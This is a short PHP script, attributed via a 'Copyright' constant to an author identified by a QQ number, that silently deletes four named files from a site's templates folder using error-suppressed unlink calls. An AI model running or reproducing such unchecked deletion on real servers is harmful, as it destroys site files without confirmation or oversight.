<?php 
define('Copyright', '作者QQ:1834219632');
define('ROOT_PATH', $_SERVER["DOCUMENT_ROOT"].'/'); 
$k = array("sGame_cq","sGame_jstb","sGame_pk","sGame_sm");
foreach($k as $v)@unlink( ROOT_PATH."templates/".$v );
?>